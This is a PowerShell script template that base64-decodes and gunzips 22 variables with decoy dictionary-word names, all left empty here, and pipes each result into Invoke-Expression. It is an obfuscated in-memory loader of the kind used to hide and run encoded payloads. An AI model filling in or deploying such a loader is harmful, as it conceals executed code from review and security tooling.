#Requires -Version 2

$Narrations = ""
$Flyweights = ""
$Repression = ""
$Reconciles = ""
$Orthogonal = ""
$Convergent = ""
$Fluffiness = ""
$Rottweiler = ""
$Ungodliest = ""
$Retweeting = ""
$Overstates = ""
$Gruesomest = ""
$Trellising = ""
$Briefcases = ""
$Eighteenth = ""
$Reproofing = ""
$Hibiscuses = ""
$Capacitors = ""
$Prefabbing = ""
$Piercingly = ""
$Polytheist = ""
$Retrievers = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Narrations,$Flyweights,$Repression,$Reconciles,$Orthogonal,$Convergent,$Fluffiness,$Rottweiler,$Ungodliest,$Retweeting,$Overstates,$Gruesomest,$Trellising,$Briefcases,$Eighteenth,$Reproofing,$Hibiscuses,$Capacitors,$Prefabbing,$Piercingly,$Polytheist,$Retrievers)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
